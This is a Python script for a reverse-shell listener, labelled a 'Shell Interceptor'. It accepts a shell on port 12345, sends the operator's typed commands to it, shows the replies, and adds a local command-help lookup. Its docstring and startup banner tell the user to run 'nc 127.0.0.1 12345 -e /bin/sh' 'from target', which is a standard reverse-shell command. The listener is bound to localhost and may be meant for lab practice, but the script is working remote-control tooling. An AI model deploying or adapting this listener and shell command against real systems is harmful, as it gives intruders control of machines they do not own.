#!/usr/bin/env python3
"""
Interactive Shell Interceptor with cmdhelp
Handles: nc 127.0.0.1 12345 -e /bin/sh
Shows shell I/O and provides cmdhelp lookup
"""

import socket
import subprocess
import sys
import os
import threading
import time

HOST = "127.0.0.1"
PORT = 12345

class ShellInterceptor:
    def __init__(self, conn, addr):
        self.conn = conn
        self.addr = addr
        self.last_command = ""
        self.running = True
        
    def run_cmdhelp(self, command_args):
        """Execute cmdhelp and return output"""
        try:
            script_dir = os.path.dirname(os.path.abspath(__file__))
            cmdhelp_path = os.path.join(script_dir, 'cmdhelp')
            
            if not os.path.exists(cmdhelp_path):
                if os.path.exists('./cmdhelp'):
                    cmdhelp_path = './cmdhelp'
                else:
                    return "Error: cmdhelp not found\n"
            
            python_cmd = 'python3' if os.name != 'nt' else 'python'
            
            result = subprocess.run(
                [python_cmd, cmdhelp_path] + command_args,
                capture_output=True,
                text=True,
                timeout=10
            )
            
            output = result.stdout
            if result.stderr:
                output += result.stderr
            
            return output if output else "No output\n"
            
        except Exception as e:
            return f"Error: {e}\n"
    
    def receive_thread(self):
        """Thread to receive data from shell"""
        while self.running:
            try:
                data = self.conn.recv(4096)
                if not data:
                    print("\n[!] Shell disconnected")
                    self.running = False
                    break
                
                output = data.decode('utf-8', errors='replace')
                
                # Print shell output
                for line in output.split('\n'):
                    if line.strip():
                        print(f"[shell] {line}")
                
            except Exception as e:
                if self.running:
                    print(f"[!] Receive error: {e}")
                break
    
    def send_command(self, cmd):
        """Send command to shell"""
        try:
            self.conn.sendall((cmd + "\n").encode())
            self.last_command = cmd
            print(f"[sent] {cmd}")
        except Exception as e:
            print(f"[!] Send error: {e}")
            self.running = False
    
    def handle_operator_input(self):
        """Handle server operator input"""
        while self.running:
            try:
                response = input("[you] ")
                
                if not self.running:
                    break
                
                # Check for cmdhelp
                if response.lower().startswith('cmdhelp'):
                    parts = response.split(maxsplit=1)
                    args = parts[1].split() if len(parts) > 1 else []
                    
                    print()
                    print("═" * 70)
                    print("cmdhelp OUTPUT (your screen only):")
                    print("═" * 70)
                    output = self.run_cmdhelp(args)
                    print(output)
                    print("═" * 70)
                    print()
                    continue
                
                # Check for intercept command
                elif response.lower() == 'intercept':
                    if self.last_command:
                        cmd_base = self.last_command.split()[0]
                        print()
                        print(f"[Analyzing: {self.last_command}]")
                        print("═" * 70)
                        output = self.run_cmdhelp([cmd_base])
                        print(output)
                        print("═" * 70)
                        print()
                    else:
                        print("[!] No command to intercept")
                    continue
                
                # Exit command
                elif response.lower() in ['exit', 'quit']:
                    print("[!] Closing connection...")
                    self.running = False
                    break
                
                # Normal command - send to shell
                else:
                    self.send_command(response)
                    
            except EOFError:
                break
            except KeyboardInterrupt:
                self.running = False
                break
            except Exception as e:
                print(f"[!] Input error: {e}")
    
    def start(self):
        """Start the interceptor"""
        # Start receive thread
        recv_thread = threading.Thread(target=self.receive_thread, daemon=True)
        recv_thread.start()
        
        # Handle operator input in main thread
        self.handle_operator_input()
        
        # Cleanup
        self.conn.close()

def main():
    print("=" * 70)
    print("Interactive Shell Interceptor with cmdhelp")
    print("=" * 70)
    print()
    print("Connect from target:")
    print("  nc 127.0.0.1 12345 -e /bin/sh")
    print()
    print("Server commands:")
    print("  cmdhelp <cmd>     - Look up command help")
    print("  cmdhelp id        - Get help for 'id' command")
    print("  intercept         - Analyze last command sent")
    print("  <any command>     - Send to shell")
    print("  exit              - Close connection")
    print()
    print("Example:")
    print("  [you] whoami")
    print("  [shell] user")
    print("  [you] cmdhelp whoami")
    print("  [shows whoami help on YOUR screen]")
    print("  [you] id")
    print("  [shell] uid=1000(user)...")
    print("  [you] intercept")
    print("  [shows id help on YOUR screen]")
    print()
    
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((HOST, PORT))
        s.listen(1)
        
        print(f"[+] Listening on {HOST}:{PORT}")
        print()
        
        while True:
            conn, addr = s.accept()
            print(f"[+] Connection from {addr}")
            print()
            
            interceptor = ShellInterceptor(conn, addr)
            interceptor.start()
            
            print("\n[+] Connection closed, waiting for next...")
            print()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Server stopped")
        sys.exit(0)
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)
